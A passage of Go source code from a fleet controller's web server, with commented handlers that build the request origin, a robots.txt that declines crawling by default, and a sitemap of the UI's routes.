// requestScheme, which believes X-Forwarded-Proto only from a trusted proxy; at
// worst that gives an http:// URL for an https:// site in a sitemap nobody is
// obliged to trust, which is the better way round to be wrong.
func (s *Server) requestOrigin(r *http.Request) string {
	if u := strings.TrimRight(strings.TrimSpace(s.cfg().Server.ExternalURL), "/"); u != "" {
		return u
	}
	scheme := s.requestScheme(r)
	host := r.Host
	if host == "" {
		return ""
	}
	return scheme + "://" + host
}

// handleRobots answers /robots.txt.
//
// A controller is somebody's infrastructure, not somebody's website, so the
// default is to ask crawlers to stay out entirely: the sign-in page and the
// application shell are served to anyone who can reach the port, and a fleet
// controller turning up in a search result is a way of being found that nobody
// asked for. An operator who is deliberately running a public instance sets
// server.allow_indexing, which is warned about at startup.
//
// Either way the file exists and says something definite. A 404 here is not
// "no opinion" -- it is an opinion a crawler is free to read as permission.
func (s *Server) handleRobots(w http.ResponseWriter, r *http.Request) {
	var b strings.Builder
	b.WriteString("# This is a Zoomies controller: https://zoomies.sh\n")
	if !s.cfg().Server.AllowIndexing {
		b.WriteString("# It is an operator interface rather than public content, so crawling is\n")
		b.WriteString("# declined. Set server.allow_indexing to invite it.\n")
		b.WriteString("User-agent: *\nDisallow: /\n")
	} else {
		b.WriteString("# server.allow_indexing is on, so the UI's own pages may be crawled. The\n")
		b.WriteString("# API answers machines, not readers, and is left out.\n")
		b.WriteString("User-agent: *\nAllow: /\nDisallow: /api/\nDisallow: /metrics\nDisallow: ")
		b.WriteString(s.cfg().GitHub.WebhookPath)
		b.WriteString("\n")
		if origin := s.requestOrigin(r); origin != "" {
			b.WriteString("\nSitemap: " + origin + "/sitemap.xml\n")
		}
	}
	// Written rather than served: the body depends on the request's own Host
	// when no external URL is configured, so a conditional request answered
	// from a shared modification time would hand one deployment's address to
	// another.
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Header().Set("Cache-Control", "public, max-age=300")
	_, _ = io.WriteString(w, b.String())
}

// handleSitemap answers /sitemap.xml with the UI's own pages.
//
// It is served whether or not indexing is allowed, because it is an honest
// machine-readable list of what this controller answers on -- useful to a link
// checker, an uptime probe or an operator writing a bookmark bar -- and it
// names nothing that /login does not already reveal. What decides whether a
// crawler acts on it is robots.txt.
func (s *Server) handleSitemap(w http.ResponseWriter, r *http.Request) {
	origin := s.requestOrigin(r)
	var b strings.Builder
	b.WriteString(xml.Header)
	b.WriteString(`<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">` + "\n")
	for _, route := range uiRoutes {
		b.WriteString("  <url><loc>")
		xml.EscapeText(&b, []byte(origin+route))
		b.WriteString("</loc></url>\n")
	}
	b.WriteString("</urlset>\n")
	w.Header().Set("Content-Type", "application/xml; charset=utf-8")
	w.Header().Set("Cache-Control", "public, max-age=300")
	_, _ = io.WriteString(w, b.String())
}

